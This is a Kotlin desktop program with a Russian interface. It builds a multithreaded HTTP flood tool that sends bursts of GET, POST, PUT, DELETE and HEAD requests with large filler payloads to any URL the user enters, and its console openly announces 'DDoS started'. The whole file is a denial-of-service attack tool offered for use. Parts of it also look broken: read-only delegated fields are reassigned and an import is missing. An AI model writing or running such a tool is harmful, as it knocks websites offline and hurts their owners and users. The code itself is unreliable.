import javafx.application.Application
import javafx.scene.control.Button
import javafx.scene.control.Label
import javafx.scene.control.TextArea
import javafx.scene.control.TextField
import javafx.scene.layout.VBox
import tornadofx.*
import kotlin.concurrent.thread

class RequestApp : App(MainView::class)

class MainView : View("HTTP Запросы") {
    // Переменные для хранения состояния
    private var totalRequests = 0
    private var getRequests = 0
    private var postRequests = 0
    private var postJsonRequests = 0
    private var putRequests = 0
    private var deleteRequests = 0
    private var headRequests = 0
    private var payloadSize = 0
    private var isRunning = false

    // Поля ввода
    private val urlInput: TextField by fxid()
    private val threadsInput: TextField by fxid()
    private val requestsInput: TextField by fxid()
    private val payloadSizeInput: TextField by fxid()
    private val getRequestsInput: TextField by fxid()
    private val postRequestsInput: TextField by fxid()
    private val postJsonRequestsInput: TextField by fxid()
    private val putRequestsInput: TextField by fxid()
    private val deleteRequestsInput: TextField by fxid()
    private val headRequestsInput: TextField by fxid()

    // Консоль
    private val console: TextArea by fxid()

    override val root = vbox {
        // Заголовок
        label("Владелец @AspectPython") {
            style {
                fontSize = 20.px
                fontWeight = FontWeight.BOLD
            }
        }

        // Поля ввода
        form {
            fieldset("Настройки запросов") {
                field("URL:") {
                    textfield().also { urlInput = it }
                }
                field("Количество потоков:") {
                    textfield().also { threadsInput = it }
                }
                field("Количество запросов в потоке:") {
                    textfield().also { requestsInput = it }
                }
                field("Размер POST-запроса (в байтах):") {
                    textfield().also { payloadSizeInput = it }
                }
                field("Количество GET-запросов:") {
                    textfield().also { getRequestsInput = it }
                }
                field("Количество POST-запросов:") {
                    textfield().also { postRequestsInput = it }
                }
                field("Количество POST JSON-запросов:") {
                    textfield().also { postJsonRequestsInput = it }
                }
                field("Количество PUT-запросов:") {
                    textfield().also { putRequestsInput = it }
                }
                field("Количество DELETE-запросов:") {
                    textfield().also { deleteRequestsInput = it }
                }
                field("Количество HEAD-запросов:") {
                    textfield().also { headRequestsInput = it }
                }
            }
        }

        // Кнопки
        hbox {
            button("Запуск") {
                action {
                    toggleStartStop()
                }
            }
            button("Очистить консоль") {
                action {
                    console.clear()
                }
            }
        }

        // Консоль
        label("Консоль:")
        textarea {
            isEditable = false
            prefRowCount = 10
            also { console = it }
        }
    }

    // Переключение между запуском и остановкой
    private fun toggleStartStop() {
        if (!isRunning) {
            if (validateInputs()) {
                isRunning = true
                appendToConsole("DDoS запущен!")
                thread {
                    runRequests()
                }
            } else {
                appendToConsole("Вы указали не все значения!")
            }
        } else {
            isRunning = false
            appendToConsole("DDoS завершен!")
        }
    }

    // Проверка введенных данных
    private fun validateInputs(): Boolean {
        return urlInput.text.isNotBlank() &&
                threadsInput.text.toIntOrNull() ?: 0 > 0 &&
                requestsInput.text.toIntOrNull() ?: 0 > 0 &&
                payloadSizeInput.text.toIntOrNull() ?: 0 > 0 &&
                (getRequestsInput.text.toIntOrNull() ?: 0 > 0 ||
                        postRequestsInput.text.toIntOrNull() ?: 0 > 0 ||
                        postJsonRequestsInput.text.toIntOrNull() ?: 0 > 0 ||
                        putRequestsInput.text.toIntOrNull() ?: 0 > 0 ||
                        deleteRequestsInput.text.toIntOrNull() ?: 0 > 0 ||
                        headRequestsInput.text.toIntOrNull() ?: 0 > 0)
    }

    // Основная логика выполнения запросов
    private fun runRequests() {
        // Сброс счетчиков
        totalRequests = 0
        getRequests = 0
        postRequests = 0
        postJsonRequests = 0
        putRequests = 0
        deleteRequests = 0
        headRequests = 0
        payloadSize = payloadSizeInput.text.toInt()

        val url = urlInput.text
        val numThreads = threadsInput.text.toInt()
        val requestsPerThread = requestsInput.text.toInt()

        val startTime = System.currentTimeMillis()

        // Запуск потоков
        val threads = List(numThreads) {
            thread {
                repeat(requestsPerThread) {
                    if (!isRunning) return@thread
                    sendAllRequests(url)
                }
            }
        }

        // Ожидание завершения всех потоков
        threads.forEach { it.join() }

        val endTime = System.currentTimeMillis()
        val duration = (endTime - startTime) / 1000.0

        if (isRunning) {
            appendToConsole("\n--- Результаты ---")
            appendToConsole("URL: $url")
            appendToConsole("Количество потоков: $numThreads")
            appendToConsole("Запросов в каждом потоке: $requestsPerThread")
            appendToConsole("Всего отправлено запросов: $totalRequests")
            appendToConsole("GET запросов: $getRequests")
            appendToConsole("POST запросов: $postRequests")
            appendToConsole("POST JSON запросов: $postJsonRequests")
            appendToConsole("PUT запросов: $putRequests")
            appendToConsole("DELETE запросов: $deleteRequests")
            appendToConsole("HEAD запросов: $headRequests")
            appendToConsole("Время выполнения: ${"%.2f".format(duration)} секунд")
            appendToConsole("Запросов в секунду: ${"%.2f".format(totalRequests / duration)}")
            isRunning = false
        }
    }

    // Отправка всех типов запросов
    private fun sendAllRequests(url: String) {
        if (getRequestsInput.text.toIntOrNull() ?: 0 > 0) sendGetRequest(url)
        if (postRequestsInput.text.toIntOrNull() ?: 0 > 0) sendPostRequest(url)
        if (postJsonRequestsInput.text.toIntOrNull() ?: 0 > 0) sendPostJsonRequest(url)
        if (putRequestsInput.text.toIntOrNull() ?: 0 > 0) sendPutRequest(url)
        if (deleteRequestsInput.text.toIntOrNull() ?: 0 > 0) sendDeleteRequest(url)
        if (headRequestsInput.text.toIntOrNull() ?: 0 > 0) sendHeadRequest(url)
    }

    // Методы для отправки запросов
    private fun sendGetRequest(url: String) {
        try {
            val response = khttp.get(url)
            if (response.statusCode == 200) {
                totalRequests++
                getRequests++
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    private fun sendPostRequest(url: String) {
        try {
            val payload = "A".repeat(payloadSize)
            val response = khttp.post(url, data = mapOf("data" to payload))
            if (response.statusCode == 200) {
                totalRequests++
                postRequests++
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    private fun sendPostJsonRequest(url: String) {
        try {
            val payload = "A".repeat(payloadSize)
            val response = khttp.post(url, json = mapOf("data" to payload))
            if (response.statusCode == 200) {
                totalRequests++
                postJsonRequests++
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    private fun sendPutRequest(url: String) {
        try {
            val payload = "A".repeat(payloadSize)
            val response = khttp.put(url, data = mapOf("data" to payload))
            if (response.statusCode == 200) {
                totalRequests++
                putRequests++
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    private fun sendDeleteRequest(url: String) {
        try {
            val response = khttp.delete(url)
            if (response.statusCode == 200) {
                totalRequests++
                deleteRequests++
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    private fun sendHeadRequest(url: String) {
        try {
            val response = khttp.head(url)
            if (response.statusCode == 200) {
                totalRequests++
                headRequests++
            }
        } catch (e: Exception) {
            // Игнорируем ошибки
        }
    }

    // Добавление текста в консоль
    private fun appendToConsole(text: String) {
        runLater {
            console.appendText("$text\n")
        }
    }
}

fun main(args: Array<String>) {
    Application.launch(RequestApp::class.java, *args)
}